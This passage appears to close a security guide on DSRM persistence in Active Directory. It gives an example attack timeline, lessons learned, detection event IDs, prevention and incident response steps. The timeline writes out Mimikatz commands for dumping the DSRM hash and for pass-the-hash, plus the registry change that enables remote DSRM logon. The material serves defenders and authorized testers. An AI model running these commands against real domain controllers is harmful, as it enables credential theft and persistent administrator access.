1. **Monday 10:00 AM:** Attacker gains RDP access to DC01 using compromised admin credentials (from earlier phishing campaign)
2. **Monday 10:30 AM:** Attacker downloads Mimikatz and executes `lsadump::sam` → extracts DSRM hash: `a4f49c4b8e6d2f1c9a3b5d7f1e3c5a7b`
3. **Monday 10:35 AM:** Attacker modifies registry: `DsrmAdminLogonBehavior = 2`
4. **Monday 10:40 AM:** Attacker logs off RDP (covers tracks by not leaving obvious session)
5. **Monday 5:00 PM:** Security team resets the admin password that was used for RDP (attacker no longer needs it)
6. **Tuesday 2:00 AM:** Attacker uses Pass-the-Hash with extracted DSRM hash to regain access: `sekurlsa::pth /domain:. /user:Administrator /ntlm:a4f49c4b8e6d2f1c9a3b5d7f1e3c5a7b`
7. **Tuesday 3:00 AM:** Attacker extracts NTDS.dit and copies to external server
8. **Thursday 10:00 AM:** Threat intelligence identifies data breach → company begins investigation
9. **Friday 2:00 AM:** Forensics team discovers `Event ID 4657` showing DSRM registry modification, traces back to Monday

**Lessons Learned:**
- Even after credential reset, DSRM persistence allowed re-entry
- Event ID 4657 monitoring would have alerted on Monday at 10:35 AM
- DSRM hash extraction (Event ID 4688 showing Mimikatz) could have been detected
- Compliance scan of all DCs would have shown suspicious `DsrmAdminLogonBehavior = 2`

---

## Summary

The **DSRM persistence attack** is a **critical threat** to Active Directory infrastructure. It requires:
1. Initial access to a Domain Controller
2. Extraction of the DSRM password hash (via Mimikatz or similar)
3. Single registry modification to enable remote DSRM access
4. Use of Pass-the-Hash to maintain persistent admin access

**Prevention & Detection:**
- ✅ Enable Event ID 4657 monitoring (registry modifications)
- ✅ Enable Event ID 4794 monitoring (DSRM password changes)
- ✅ Ensure `DsrmAdminLogonBehavior` is 0 or absent
- ✅ Change DSRM passwords regularly (annually minimum)
- ✅ Use unique, complex DSRM passwords per DC
- ✅ Monitor Mimikatz execution (process creation, binary downloads)
- ✅ Implement comprehensive audit logging on all DCs

**Response:**
- Immediately isolate affected DC
- Collect forensic evidence
- Reset DSRM password
- Search logs for attacker activity
- Rebuild DC from clean backup
- Audit all other DCs for same compromise

This document should be used as a comprehensive resource for Red Teams executing DSRM attacks in authorized engagements, and for Blue Teams building detections and defenses against this critical persistence technique.

---